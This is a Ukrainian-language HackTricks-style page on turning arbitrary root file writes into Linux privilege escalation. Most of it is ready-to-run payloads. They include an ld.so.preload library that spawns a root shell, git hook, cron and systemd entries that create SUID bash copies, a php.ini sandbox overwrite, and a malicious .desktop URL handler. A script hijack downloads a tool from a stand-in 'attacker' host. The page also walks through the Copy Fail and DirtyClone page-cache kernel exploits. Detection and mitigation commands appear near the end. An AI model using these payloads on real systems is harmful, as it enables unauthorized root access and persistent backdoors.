# Довільний запис у файл від імені root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл працює як змінна оточення **`LD_PRELOAD`**, але також працює у **SUID binaries**.\
Якщо ви можете створити або змінити його, просто додайте **шлях до бібліотеки, яка завантажуватиметься** під час виконання кожного binary.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **scripts**, які **запускаються** під час різних **events** у git repo, наприклад під час створення commit, merge... Отже, якщо **privileged script або user** часто виконує ці дії та є можливість **записувати до папки `.git`**, це можна використати для **privesc**.

Наприклад, можна **створити script** у git repo в **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron та файли часу

Якщо ви можете **записувати файли, пов’язані з cron, які виконує root**, зазвичай можна отримати виконання коду під час наступного запуску завдання. Цікавими цілями є:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і служби, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове root cron job** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Вбудувати backdoor в наявну ціль timer**, змінивши скрипт або binary, який вона запускає

Мінімальний приклад cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати лише в каталог cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Примітки:

- `run-parts` зазвичай ігнорує назви файлів, що містять крапки, тому надавайте перевагу назвам на кшталт `backup`, а не `backup.sh`.
- Деякі дистрибутиви використовують `anacron` або таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.

### Файли Service і Socket

Якщо ви можете записувати **unit-файли `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду від імені root, перезавантаживши та перезапустивши unit або дочекавшись спрацювання шляху активації service/socket.

Цілями можуть бути:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-перевизначення в `/etc/systemd/system/<unit>.d/*.conf`
- Service-скрипти/бінарні файли, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажує root service

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Поширені шляхи зловживання:

- **Перезаписати `ExecStart=`** у service unit, що належить root і який ви можете змінювати
- **Додати drop-in override** із malicious `ExecStart=` і спочатку очистити старий
- **Вбудувати backdoor у script/binary**, на який уже посилається unit
- **Перехопити socket-activated service**, змінивши відповідний `.service` file, який запускається, коли socket отримує з'єднання

Приклад malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий процес активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете самостійно перезапустити сервіси, але можете редагувати socket-activated unit, можливо, вам потрібно лише **дочекатися підключення клієнта**, щоб ініціювати виконання backdoored service від імені root.

### Перезапис обмежувального `php.ini`, який використовується привілейованою PHP sandbox

Деякі custom daemons перевіряють наданий користувачем PHP-код, запускаючи `php` із **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox усе ще має **будь-який примітив запису** (наприклад, `file_put_contents`), а ви можете отримати доступ до **точного шляху `php.ini`**, який використовує daemon, ви можете **перезаписати цю конфігурацію**, скасувати обмеження, а потім надіслати другий payload, який виконається з підвищеними привілеями.

Типовий порядок дій:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код після повторного ввімкнення небезпечних функцій.

Мінімальний приклад (замініть шлях на той, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon працює від імені root (або перевіряє шляхи, власником яких є root), друге виконання відбувається в контексті root. По суті, це **privilege escalation через перезапис конфігурації**, коли runtime у sandbox все ще може записувати файли.

### binfmt_misc

Файл, розташований у `/proc/sys/fs/binfmt_misc`, указує, який binary має виконувати файли певного типу. TODO: перевірити вимоги для зловживання цим механізмом з метою запуску rev shell, коли відкривається файл поширеного типу.

### Перезапис обробників схем (наприклад, http: або https:)

Зловмисник із правами на запис до каталогів конфігурації жертви може легко замінити або створити файли, які змінюють поведінку системи, що призводить до ненавмисного виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники URL HTTP і HTTPS указували на шкідливий файл (наприклад, задавши `x-scheme-handler/http=evil.desktop`), зловмисник гарантує, що **натискання будь-якого посилання http або https запускає код, указаний у цьому `evil.desktop` файлі**. Наприклад, після розміщення наведеного нижче шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications` будь-яке натискання зовнішнього URL запускає вбудовану команду:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Для отримання додаткової інформації перегляньте [**цей пост**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), де це було використано для експлуатації реальної вразливості.

### Root виконує скрипти/бінарні файли, доступні для запису користувачу

Якщо привілейований workflow запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл усередині директорії, що належить непривілейованому користувачу), ви можете перехопити його:

- **Виявлення виконання:** відстежуйте процеси за допомогою [pspy](https://github.com/DominicBreuker/pspy), щоб перехопити запуск root шляхів, контрольованих користувачем:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу або доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу root-дію), після чого відновіть permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть privileged action** (наприклад, натисніть UI-кнопку, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

### Модифікація privileged binaries лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дозволяють змінювати лише **копію page cache** читабельного файлу. Якщо ціллю є **setuid** або інший файл, який виконується від імені **root**, наступне виконання може запустити контрольовані attacker-ом байти з пам’яті та підвищити privileges, навіть якщо file hash на диску не змінився.

Це корисно розглядати як **runtime-only file write primitive**:

- **Disk залишається чистим**: inode і байти на диску не змінюються
- **Memory є зміненою**: процеси, які читають або виконують cached page, отримують модифікований attacker-ом вміст
- **Ефект є тимчасовим**: зміна зникає після reboot або cache eviction

Цей primitive займає проміжне місце між класичним **arbitrary file write** і старішими bugs зловживання **page cache**, такими як Dirty COW / Dirty Pipe:

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо write position
- Primitive, який працює лише в page cache, може бути надійнішим, якщо vulnerable path надає direct writes до cached file-backed pages

#### Generic privesc flow

1. Отримайте kernel primitive, здатний записувати у **file-backed page cache pages**
2. Використайте його проти **readable privileged binary** або іншого файлу, який виконується від імені root
3. Запустіть виконання **до** того, як page буде evicted з cache
4. Отримайте code execution як root, поки файл на диску все ще виглядає незміненим

Типові high-value targets:

- **setuid-root** binaries
- Helpers, які запускаються **root services**
- Binaries, які часто виконуються з **containers, що спільно використовують host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) є хорошим прикладом цього класу. Vulnerable path знаходився в Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` може переміщувати references на page-cache pages із readable file у crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source і destination buffers
- `authencesn` після цього записував у destination tag region
- коли ця region усе ще посилалася на spliced file-backed pages, запис потрапляв у **page cache target file**

Отже, цікавою є не сама CVE, а pattern:

- **передати file-backed cache pages у kernel subsystem**
- змусити subsystem **розглядати їх як writable output**
- виконати невелике контрольоване overwrite у memory

Public PoC використовував повторювані **4-byte writes**, щоб patch-ити `/usr/bin/su` у memory, а потім виконував його.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого pattern **page-cache-only write-to-root**, але цього разу sink — **IPsec ESP decrypt**, а не `AF_ALG`.

Важливою technique є **metadata-laundering step**:

- `splice()` поміщає **read-only file-backed page-cache page** у ESP-in-UDP packet
- початкове DirtyFrag mitigation позначало цей skb як `SKBFL_SHARED_FRAG`, щоб `esp_input()` виконав **copy before decrypting**
- netfilter `TEE` дублює packet через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone зберігає **те саме physical page-cache reference**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає clone безпечним і виконує **in-place `cbc(aes)` decrypt** поверх file-backed page

Отже, lesson для reviewer є ширшим за саму CVE: якщо mitigation залежить від **skb/page metadata**, щоб визначити, чи потрібно спочатку виконати copy, будь-який **clone/copy path, який зберігає backing page, але видаляє metadata**, може непомітно знову відкрити write primitive.

Типовий exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` всередині private network namespace**
2. підняти loopback і встановити **netfilter `TEE` rule** у `mangle/OUTPUT`
3. встановити **XFRM ESP transport SAs** через `NETLINK_XFRM`
4. закодувати кожне target 4-byte word у полі SA `seq_hi` (word-selection trick від DirtyFrag)
5. надіслати spliced ESP-in-UDP packet, щоб **TEE clone** досяг `esp_input()` і виконав decrypt **in place**
6. повторювати, доки page-cache copy `/usr/bin/su` або іншого privileged executable не міститиме code, контрольований attacker-ом

З operational точки зору impact такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **mutated page-cache bytes** і надає root.

Корисні exposure checks для цього варіанта:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Короткострокове зменшення attack surface тут також залежить від конкретного шляху: оновлення до kernel, що містить `48f6a5356a33`, виправляє шлях clone, тоді як блокування autoload `xt_TEE` усуває **етап flag-laundering**, а блокування `esp4` / `esp6` усуває **decrypt sink**.

#### Виявлення та пошук

Якщо ви підозрюєте цей клас вразливостей, не покладайтеся лише на перевірки цілісності диска. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` може завантажуватися та вивантажуватися як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у kernel
- setuid binaries є хорошими цілями, оскільки патча, що працює лише з page cache, може бути достатньо, щоб перетворити локальний foothold на root

#### Зменшення attack surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо це скомпільовано в kernel, у деяких disclosures повідомлялося про блокування init path за допомогою:
```bash
initcall_blacklist=algif_aead_init
```
Такий вид mitigation варто пам’ятати й для інших kernel LPE: якщо exploitation залежить від конкретного optional interface, його вимкнення або blacklisting може зламати exploit path ще до того, як стане доступним повне оновлення kernel.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Розкриття інформації Openwall oss-security щодо CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Виправлення Linux stable: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Рекомендації Copy Fail](https://copy.fail/)
- [Технічний writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Репозиторій / README DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Виправлення Linux: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Попередня mitigation у Linux: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
